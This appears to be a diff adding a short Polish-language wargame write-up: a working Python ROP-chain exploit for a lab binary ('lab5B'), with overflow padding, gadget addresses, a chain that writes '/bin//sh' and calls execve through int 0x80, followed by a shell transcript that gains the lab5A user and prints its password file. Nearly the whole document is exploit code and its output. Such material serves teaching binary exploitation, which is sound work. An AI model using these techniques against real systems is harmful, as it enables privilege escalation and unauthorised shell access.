@@ -1,0 +1,91 @@
+Klasyczny rop-chain :) exploit:
+
+/bin//sh wpisujemy w jeden z adresow write+read (gdb vmmap)
+
+--------EXPLOIT----------------
+import struct
+
+def p(x):
+    return struct.pack("<L", x)
+
+padding = "A"*128
+
+EBX_overwrite="B"*4
+EDI_overwrite="C"*4
+EBP_overwrite="D"*4
+EIP_overwrite="E"*4
+
+payload = ""
+payload += padding
+payload += EBX_overwrite
+payload += EDI_overwrite
+payload += EBP_overwrite
+
+# payload += EIP_overwrite
+
+# Gadgets:
+# 0x080bbf26 : pop eax ; ret
+# 0x080481c9 : pop ebx ; ret
+# 0x080e55ad : pop ecx ; ret
+# 0x0806ec5a : pop edx ; ret
+# 0x0806ec81 : pop ecx ; pop ebx ; ret
+# 0x0809a95d : mov dword ptr [edx], eax ; ret
+# 0x080db234 : inc ecx ; ret
+# 0x0805d3c7 : inc edx ; ret
+
+# 0x0806ec24 : movzx eax, al ; ret
+# 0x080544e0 : xor eax, eax ; ret
+
+
+
+payload += p(0x0806ec5a) # pop edx
+payload += p(0x080ea06f) # write here, dobranie tak, ze ostatni bajt to jest 00
+
+payload += p(0x080e55ad) # pop ecx
+payload += "/bin"
+
+payload += p(0x08054c72) # mov [edx], ecx ; ret
+
+payload += p(0x0806ec5a) # pop edx
+payload += p(0x80ea073) # write here kolejnej czesci
+payload += p(0x080e55ad) # pop ecx
+payload += "//sh"
+payload += p(0x08054c72) # mov [edx], ecx ; ret
+
+#zerowanie X
+# payload += p(0x080544e0) # xor eax, eax # s
+# payload += p(0x0806ec5a) # pop edx ; ret
+# payload += p(0x80ea076)
+
+# payload += p(0x08054c72) # mov [edx], ecx ; ret
+# payload += p(0x809a95d) #  : mov dword ptr [edx], eax ; ret
+
+payload += p(0x0806ec81) # pop ecx ; pop ebx ; ret
+payload += p(0xffffffff) # pozniej doda sie jeden i bedzie zero
+payload += p(0x80ea06f) # //sh do EBX
+
+payload += p(0x0806ec5a) # pop edx ; ret
+payload += p(0xffffffff)
+
+# Zerowanie ecx, edx:
+payload += p(0x080db234) # ecx++
+payload += p(0x0805d3c7) # edx++
+
+payload += p(0x080bbf26) # pop eax ; ret
+payload += p(0x4141410b) # eax: 0x4141410b
+payload += p(0x0806ec24) # al do eax bez null byte
+
+
+payload += p(0x08049401) # int 0x80
+
+
+
+print payload
+--------------------------- koniec exploita --------------------------
+
+Insert ROP chain here:
+id
+uid=1019(lab5B) gid=1020(lab5B) euid=1020(lab5A) groups=1021(lab5A),1001(gameuser),1020(lab5B)
+cd /home/lab5A
+cat .pass
+th4ts_th3_r0p_i_lik3_2_s33
